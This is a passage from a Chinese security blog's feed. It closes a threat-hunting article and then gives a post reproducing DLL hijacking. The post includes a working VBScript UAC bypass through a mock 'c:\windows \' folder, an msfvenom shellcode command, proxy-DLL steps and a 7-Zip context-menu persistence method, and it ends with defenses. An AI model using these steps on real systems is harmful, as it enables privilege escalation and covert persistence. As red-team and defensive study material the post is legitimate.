title="自动猎捕"></a>自动猎捕</h4><p>这一步其实是将我们前面的研究成果落地，为产品赋能，固化成脚本或工具，提高分析效率，创造直接价值</p><p>通过上面的步骤人工识别出威胁后，我们就可以采取一些自动化的措施来提高后续的分析效率，并直接创造价值</p><p>很多人在这一步直接将威胁狩猎的成果固化成规则模型，把很多异常行为直接定性成告警，最后造成<strong>告警疲劳(alert fatigue)</strong></p><p><img src="http://photo.moofeng.cn/typora/image-20211121124058371.png" alt="image-20211121124058371"></p><p>其实除了这一实践之外，我们还可以通过建设 dashboard 的方式提高安全运营人员的工作效率，帮助发现潜伏的攻击者</p><p>举个两个小例子：</p><ol><li><p>利用防火墙日志，根据IP地址进行聚合，计算53端口(DNS)的发送字节总数，依此创建一个TOP排行榜，通常前几名应该是近似的，关注异常值</p></li><li><p>利用代理服务器日志，根据用户名和IP进行聚合，计算HTTP POST方法的发送字节总数，依此创建一个TOP排行榜，关注异常点</p></li></ol><p>当然，研究威胁活动之后输出的分析报告同样会对安全社区起到极大地推动作用，这也是一种很棒的产出</p><h4 id="分享记录"><a href="#分享记录" class="headerlink" title="分享记录"></a>分享记录</h4><p>最后为了方便复盘、分享和团队协作，务必要做好文档管理</p><p>不仅仅是我们的检测规则，还有攻击复现过程、恶意样本日志，甚至包括狩猎过程中所使用到的奇技淫巧</p><p>例如对于新的攻击方法，我们可以将复现过程编写成Caldera的插件或者Atomic的脚本</p><p>对于已复现的攻击步骤，我们可以记录下日志数据，打包归档，方便其他成员实时分析，参照：<a href="https://securitydatasets.com/">https://securitydatasets.com/</a></p><p><img src="http://photo.moofeng.cn/typora/image-20211121135105389.png" alt="image-20211121135105389"></p><p>对于规则文档，基于日志的可以用sigma记录，基于流量的可以用snort，基于文件的可以用yara</p><p>而对于大家的研究成果，如果能及时分享到安全社区更是再好不过，除了提高影响力，更是对其他初学者的一盏指路明灯，譬如笔者的一身技能就几乎全部来自于Twitter</p><p>传承与成长，是安全社区最宝贵的文化之一</p><h3 id="做个总结"><a href="#做个总结" class="headerlink" title="做个总结"></a>做个总结</h3><p>受限于篇幅，很多地方都是一笔带过，本文主要还是想分享下威胁狩猎的含义和实践步骤</p><p>很多人对威胁狩猎的概念模糊不清，对其全流程一知半解，出了问题难以定位到具体环节，最后的检测效果自然无法保证</p><p>除此之外，站在整个安全生命周期的视角上看，威胁狩猎其实只是一段征途的起点</p><p>它更多的是帮助我们理解攻击行为，挖掘威胁活动，后续还有<strong>检测工程</strong>、<strong>事件响应</strong>、<strong>漏洞管理</strong>等同样重要的流程</p><p>以后有时间，我会再总结下检测工程的实践方案，聊聊”<strong>Detection as Code</strong>“的概念，还有威胁检测与CI&#x2F;CD流程的结合</p><p>Happy Hunting！</p>]]></content>
    
    
    <categories>
      
      <category>检测工程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>浅析DLL劫持与持久化</title>
    <link href="/posts/1987889922/"/>
    <url>/posts/1987889922/</url>
    
    <content type="html"><![CDATA[<h2 id="DLL-劫持简介"><a href="#DLL-劫持简介" class="headerlink" title="DLL 劫持简介"></a>DLL 劫持简介</h2><h3 id="Windows加载DLL的规则"><a href="#Windows加载DLL的规则" class="headerlink" title="Windows加载DLL的规则"></a>Windows加载DLL的规则</h3><p>首先会尝试从<strong>当前程序所在的目录</strong>加载DLL，如果没找到则在Windows系统目录中查找，如果还是没有则会去环境变量中列出的各个目录下查找</p><h3 id="DLL-劫持的目的"><a href="#DLL-劫持的目的" class="headerlink" title="DLL 劫持的目的"></a>DLL 劫持的目的</h3><ul><li><p><strong>Execution</strong></p><p>常见的白加黑，利用可信任的（最好被微软签名过）可执行程序加载恶意 DLL</p></li><li><p><strong>Persistence</strong></p><p>劫持目标操作系统中已预先安装并且会定期运行的软件所需加载的 DLL</p></li><li><p><strong>Privilege escalation</strong></p><p>如果目标应用程序正以高权限运行，劫持后的恶意代码也会以相应的权限执行</p></li></ul><h3 id="DLL-劫持的方法"><a href="#DLL-劫持的方法" class="headerlink" title="DLL 劫持的方法"></a>DLL 劫持的方法</h3><h4 id="1-DLL-replacement"><a href="#1-DLL-replacement" class="headerlink" title="1. DLL replacement"></a><strong>1. DLL replacement</strong></h4><p>用恶意的DLL替换掉合法的DLL，可以将其与 <a href="https://kevinalmansa.github.io/application%20security/DLL-Proxying/">DLL Proxying</a> 结合使用，以确保原DLL的所有功能均保持不变。</p><h4 id="2-DLL-search-order-hijacking"><a href="#2-DLL-search-order-hijacking" class="headerlink" title="2. DLL search order hijacking"></a><strong>2. DLL search order hijacking</strong></h4><p>当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下<a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">搜索</a>待加载的DLL。</p><p>通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。</p><h4 id="3-Phantom-DLL-hijacking"><a href="#3-Phantom-DLL-hijacking" class="headerlink" title="3. Phantom DLL hijacking"></a><strong>3.</strong><a href="http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/"> <strong>Phantom DLL hijacking</strong></a></h4><p>释放一个恶意 DLL 来代替丢失的或者不存在的 要被合法应用程序加载的DLL。</p><h4 id="4-DLL-redirection"><a href="#4-DLL-redirection" class="headerlink" title="4. DLL redirection"></a><strong>4. DLL redirection</strong></h4><p>更改DLL搜索的路径，比如通过编辑 %PATH% 环境变量或 <a href="https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests">.exe.manifest</a>&#x2F;<a href="https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection">.exe.local</a>文件以将搜索路径定位到包含恶意DLL的地方。</p><h4 id="5-WinSxS-DLL-replacement"><a href="#5-WinSxS-DLL-replacement" class="headerlink" title="5. WinSxS DLL replacement"></a><strong>5. WinSxS DLL replacement</strong></h4><p>将目标DLL相关的WinSxS文件夹中的合法的DLL替换为恶意DLL。</p><p>此方法通常也被称为 <a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf">DLL side loading</a>。</p><h4 id="6-Relative-path-DLL-Hijacking"><a href="#6-Relative-path-DLL-Hijacking" class="headerlink" title="6. Relative path DLL Hijacking"></a><strong>6. Relative path DLL Hijacking</strong></h4><p>将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。</p><p>在使用方法上，它与（带签名的）<a href="https://attack.mitre.org/techniques/T1218/">二进制代理执行</a> 有相似之处。</p><p>它的一个变体是（有点矛盾地称为）“<a href="https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/">bring your own LOLbin</a>”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><h2 id="攻击手法复现"><a href="#攻击手法复现" class="headerlink" title="攻击手法复现"></a>攻击手法复现</h2><h3 id="1-Relative-path-DLL-Hijacking-DLL-proxy-loading-UAC-bypass"><a href="#1-Relative-path-DLL-Hijacking-DLL-proxy-loading-UAC-bypass" class="headerlink" title="1. Relative path DLL Hijacking + DLL proxy loading + UAC bypass"></a>1. Relative path DLL Hijacking + DLL proxy loading + UAC bypass</h3><p>首先我们要在系统文件夹中找到容易受到攻击的可执行文件</p><p>采用的方法可以参考：<a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows">https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows</a></p><p>最后汇总的劫持目标罗列在 <a href="https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv">这里</a> ，注意，劫持目标不要带参数，最好也不要带弹窗和任何可视化元素</p><p>我选定的测试文件： <strong>EASPolicyManagerBrokerHost.exe</strong> + <strong>InprocLogger.dll</strong></p><p>然后要创建一个代理DLL，参考这个项目： <a href="https://github.com/rek7/dll-hijacking">https://github.com/rek7/dll-hijacking</a></p><p>首先运行 parse.py 生成导出指令写入 definitions.h，原理可以参考：<a href="https://itm4n.github.io/dll-proxying/">https://itm4n.github.io/dll-proxying/</a></p><p><img src="https://photo.moofeng.cn/typora/image-20200724184435451.png" alt="image-20200724184435451"></p><p>然后修改项目内的 <code>./malicious_dll/dllmain.cpp</code> 文件</p><p><img src="https://photo.moofeng.cn/typora/image-20200724184653940.png" alt="image-20200724184653940"></p><p>原代码这里是借助 powershell 反弹 shell，这大段代码我们都删掉，先简单加个弹框试试效果（代码参考下方弹框截图）</p><p>修改好代码后使用 Visual Studio 编译生成 malicious_dll.dll</p><p><img src="https://photo.moofeng.cn/typora/image-20200724185121424.png" alt="image-20200724185121424"></p><p>将该代理 DLL 文件复制到测试目录下重命名为 InprocLogger.dll，原文件重命名为 InprocLogger_.dll</p><p><img src="https://photo.moofeng.cn/typora/image-20200724185248046.png" alt="image-20200724185248046"></p><p>然后尝试直接启动 EASPolicyManagerBrokerHost.exe，可以看到，成功弹框</p><p><img src="https://photo.moofeng.cn/typora/image-20200725090949047.png" alt="image-20200725090949047"></p><p>接着我们再进一步修改代码，方便导入任意 shellcode，参考：<a href="https://gist.github.com/securitytube/c956348435cc90b8e1f7">https://gist.github.com/securitytube/c956348435cc90b8e1f7</a></p><p><img src="https://photo.moofeng.cn/typora/image-20200725091337126.png" alt="image-20200725091337126"></p><p>下面以计算器弹窗为例，借助 MSF 生成 shellcode：</p><p><code>msfvenom -a x64 -platform windows -p windows/x64/exec cmd=&quot;calc.exe&quot; -f raw</code></p><p>将 shellcode 替换进源码</p><p><img src="https://photo.moofeng.cn/typora/image-20200724195949918.png" alt="image-20200724195949918"></p><p>然后，Bingo！</p><p><img src="https://photo.moofeng.cn/typora/image-20200725091552996.png" alt="image-20200725091552996"></p><p>前面每次运行 EASPolicyManagerBrokerHost.exe 都需要手动授权</p><p><img src="https://photo.moofeng.cn/typora/image-20200725092112467.png" alt="image-20200725092112467"></p><p>现在，我们尝试利用 <a href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">伪造受信任目录</a> 技术绕过 UAC 以更高权限执行 systemreset.exe 并加载恶意 DLL</p><p>简单描述下原理，用户可以通过创建文件夹<code>c:\windows \system32\</code>（注意路径中包含空格）来自动提升该目录内可执行文件的权限</p><p>传统方式无法创建带尾随空格的文件夹，但是我们可以通过C语言代码或者VBScript来完成这一工作</p><p>我所用到的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vba">Set oFSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>Set wshshell = wscript.createobject(&quot;WScript.Shell&quot;)<br><br>&#x27; Get target binary and payload<br>Const strBinary = &quot;EASPolicyManagerBrokerHost.exe&quot;<br>Const binaryPath = &quot;.\EASPolicyManagerBrokerHost.exe&quot;<br>Const OriginalDLL = &quot;.\InprocLogger_.dll&quot;<br>Const EvilDLL = &quot;.\InprocLogger.dll&quot;<br><br>&#x27; Create folders<br>Const target = &quot;c:\windows \&quot;<br>target_sys32 = (target &amp; &quot;system32\&quot;)<br>target_binary = (target_sys32 &amp; strBinary)<br>If Not oFSO.FolderExists(target) Then oFSO.CreateFolder target End If<br>If Not oFSO.FolderExists(target_sys32) Then oFSO.CreateFolder target_sys32 End If<br><br>&#x27; Copy legit binary and evil DLLs<br>oFSO.CopyFile binaryPath, target_binary<br>oFSO.CopyFile EvilDLL, target_sys32<br>oFSO.CopyFile OriginalDLL, target_sys32<br>&#x27; Run, Forrest, Run!<br>wshshell.Run(&quot;&quot;&quot;&quot; &amp; target_binary &amp; &quot;&quot;&quot;&quot;)<br><br>&#x27; Clean files<br>&#x27; Deletion using VBScript is problematic, use PowerShell instead<br>command =&quot;powershell /c &quot;&quot;rm -r &quot;&quot;&quot;&quot;\\?\&quot; &amp; target &amp; &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;<br>wshshell.Run command,0<br></code></pre></td></tr></table></figure><p>脚本运行后成功绕过 UAC 并弹出计算器！</p><p><img src="https://photo.moofeng.cn/typora/image-20200725103649004.png" alt="image-20200725103649004"></p><p><strong>注：最新版本win10上好像行不通了，需要其他 bypass UAC 的方式代替，但是公司现在使用的操作系统版本上还存在这一漏洞</strong></p><p>踩坑：</p><ol><li>parse.py 文件中的 dumpbin.exe 路径要替换成自己电脑中对应的文件路径</li></ol><p><img src="https://photo.moofeng.cn/typora/image-20200725105417863.png" alt="image-20200725105417863"></p><p>2. </p><p><img src="https://photo.moofeng.cn/typora/image-20200724174851614.png" alt="image-20200724174851614"></p><p>parse.py 文件在windows环境运行出现编码错误时，此处替换成 “gbk”</p><p>3. </p><p><img src="https://photo.moofeng.cn/typora/image-20200724174935792.png" alt="image-20200724174935792"></p><p>无法导出头文件时，更换目标 DLL</p><ol start="4"><li>编译和 shellcode 生成过程中架构环境记得对应</li></ol><blockquote><p>TIPS:</p><ul><li>这里的 Relative path DLL Hijacking 技术可以替换成常见的白加黑</li><li>DLL proxy loading 不仅简化了自定义开发 DLL 的步骤，让攻击者专注于 shellcode 的设计，而且也避免了修改原始 DLL 后可能出现的程序崩溃等错误 ，而且这一技术早在几年前就被实战中用于 APT，比如“绿色版”软件，效果非常好</li></ul></blockquote><h3 id="2-持久化中的应用"><a href="#2-持久化中的应用" class="headerlink" title="2. 持久化中的应用"></a>2. 持久化中的应用</h3><p>接下来尝试将 DLL 劫持应用到持久化的方法中</p><p>这里我选择的突破口是我们日常单击右键出现的<a href="https://b.ou.is/articles/2020-03/context-menu-persistance">上下文菜单</a>：</p><p><img src="https://photo.moofeng.cn/typora/image-20200725104928549.png" alt="image-20200725104928549"></p><p>以我们外网 VDI 默认安装的 7-Zip 为例，借助 Autoruns 定位到 DLL 文件</p><p><img src="https://photo.moofeng.cn/typora/image-20200725105054422.png" alt="image-20200725105054422"></p><p>制作代理 DLL 的方式如上所述，然后将 7-zip 程序目录下的 7-zip.dll 更名为 7-zip_.dll，再将我们制作好的 malicious_dll.dll 更名为 7-zip.dll 复制过去</p><p>最后需要重启计算机，因为该DLL一旦被激活就仅被加载到内存中一次，它将继续存在于内存中，直到系统重新启动为止</p><p>重启后，对文件单击鼠标右键，win + E 打开资源管理器，或者直接使用 7-zip等操作，都会触发 payload</p><p><img src="https://photo.moofeng.cn/typora/image-20200725113544693.png" alt="image-20200725113544693"></p><p>PS: 测试过程中 explorer.exe 崩了几次，实战中可能还需要做一定的修改</p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ol><li>应用程序加载 DLL 时应该使用绝对路径而不是相对路径</li><li>最好的选择是在应用程序加载所有 DLL 之前先进行验证</li><li>启动项中涉及的 DLL 也要定期做检查和校验</li><li>检测路径中带有空格的文件夹，提高 UAC 模式并设置为“总是通知”，防止 UAC bypass</li></ol>]]></content>
    
    
    <categories>
      
      <category>安全攻防</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
